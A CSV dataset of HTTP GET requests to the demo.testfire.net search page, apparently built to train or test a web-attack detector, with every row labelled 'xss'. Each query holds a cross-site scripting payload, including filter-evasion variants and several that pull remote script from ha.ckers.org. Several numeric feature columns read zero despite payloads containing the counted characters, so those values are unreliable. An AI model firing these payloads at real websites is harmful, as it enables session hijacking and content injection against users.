method,path,headers,body,body_length,num_commas,num_hyphens,num_brackets,num_quotes,num_double_quotes,num_slashes,num_braces,num_spaces,has_sql_keywords,has_xss_payload,has_csrf_token,nature
GET,http://demo.testfire.net/search.jsp?query=> <script>alert(4)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,http://demo.testfire.net/search.jsp?query=</title><script>alert(1)</script>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<<script>alert(""xss"");//<</script>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=>""'","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,xss
GET,"http://demo.testfire.net/search.jsp?query='';!--""<XSS>=&{()}","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,xss
GET,http://demo.testfire.net/search.jsp?query=*/a=eval;b=alert;a(b(/e/.source));/*,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,xss
GET,http://demo.testfire.net/search.jsp?query='%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,http://demo.testfire.net/search.jsp?query=<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,http://demo.testfire.net/search.jsp?query=&#39);x=alert;x(&#40 /finally through!/.source &#41);//,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,xss
GET,http://demo.testfire.net/search.jsp?query=</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""XSS"")>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=perl -e 'print ""<SCR\0IPT>alert(""XSS"")</SCR\0IPT>"";' > out","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<DIV STYLE=""background-image: url(http://ha.ckers.org/xss.js)"">Div Body</DIV> ","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,0,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT =""blah"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a=""blah"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,"http://demo.testfire.net/search.jsp?query=<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>","{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
GET,http://demo.testfire.net/search.jsp?query=<SCRIPT SRC=http://ha.ckers.org/xss.js,"{'host': 'demo.testfire.net', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.5', 'Referer': 'https://demo.testfire.net/', 'Connection': 'keep-alive', 'Cookie': 'JSESSIONID=9E8933590F9265E212CE30116067F508', 'Upgrade-Insecure-Requests': '1', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1'}",,0,0,0,0,0,0,0,0,0,0,1,0,xss
